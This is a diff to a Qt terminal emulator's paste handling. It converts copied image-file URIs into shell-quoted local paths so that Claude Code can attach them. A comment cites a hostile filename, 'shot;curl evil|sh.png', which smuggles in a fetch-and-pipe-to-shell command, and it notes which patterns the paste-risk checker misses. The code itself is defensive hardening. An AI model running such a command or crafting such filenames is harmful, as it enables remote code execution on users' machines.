@@ -3,6 +3,7 @@
 #include "clipboardguard.h"  // ANTS-1014 — clipboard write funnel
 #include "debuglog.h"
 #include "regexharden.h"     // ANTS-1665 — harden user search / rule patterns
+#include "shellutils.h"      // ANTS-3828 — shellQuote() for pasted file paths
 
 #include <QImageReader>
 #include <QPainter>
@@ -1922,6 +1923,33 @@ void TerminalWidget::keyPressEvent(QKeyEvent *event) {
                 return;
             }
         }
+
+        // ANTS-3828 (user-report 2026-08-04) — a copied image *file* puts
+        // `text/uri-list` on the clipboard and NO raster, so hasImage()
+        // above is false and the paste fell through to the plain-text
+        // branch, writing `file:///home/…/shot.png` verbatim to the PTY.
+        // Claude Code can't resolve a file:// URI as a path, so the
+        // attachment never formed. Insert the bare local path instead.
+        //
+        // The file already exists on disk, so this branch deliberately
+        // does NOT save anything — the paste-dir canonicalisation above
+        // guards a directory *we* write into and has nothing to do with a
+        // path the user already chose.
+        //
+        // Scope: image files only. A copied .txt / .pdf keeps the existing
+        // text-paste behaviour; widening it is a separate decision, not a
+        // side effect of this fix.
+        if (mime->hasUrls()) {
+            const QString paths = imagePathsFromUrls(mime->urls());
+            if (!paths.isEmpty()) {
+                pasteToTerminal(paths.toUtf8());
+                return;
+            }
+            // No local image URL among them — fall through to the text
+            // paste, which is still the right answer for an http:// URL
+            // or a non-image file.
+        }
+
         if (mime->hasText() && hasPty()) {
             pasteToTerminal(clipboard->text().toUtf8());
         }
@@ -2705,6 +2733,37 @@ void TerminalWidget::checkIdleNotification() {
             });
         }
     }
+}
+
+// ANTS-3828 — see the declaration in terminalwidget.h for what this is
+// for. Contract: bare local paths of the image files in `urls`, joined
+// with a space; empty when there are none.
+//
+// Shell safety. Unlike the saved-image path in keyPressEvent — whose
+// filename we generate, so it is safe by construction — this path is
+// whatever the file happens to be called on disk, and a downloaded or
+// extracted file can be named `shot;curl evil|sh.png`. The paste lands
+// at a shell prompt for tokenisation, and pasteRiskReasons() flags
+// newlines, `sudo`, pipe-to-shell and control characters but NOT `;` or
+// `$(…)`, so nothing downstream would warn. shellQuote() leaves an
+// ordinary path bare — the common case, and the form Claude Code wants
+// to read — and single-quotes anything else, which also fixes the
+// ordinary filename that merely contains a space.
+QString TerminalWidget::imagePathsFromUrls(const QList<QUrl> &urls) {
+    // What Qt can actually decode, rather than a hardcoded suffix list
+    // that would drift from the installed image plugins.
+    static const QList<QByteArray> kImageSuffixes =
+        QImageReader::supportedImageFormats();
+
+    QStringList paths;
+    for (const QUrl &url : urls) {
+        if (!url.isLocalFile()) continue;
+        const QString path = url.toLocalFile();
+        if (!kImageSuffixes.contains(QFileInfo(path).suffix().toLower().toUtf8()))
+            continue;
+        paths << shellQuote(path);
+    }
+    return paths.join(QLatin1Char(' '));
 }
 
 void TerminalWidget::pasteToTerminal(const QByteArray &data) {
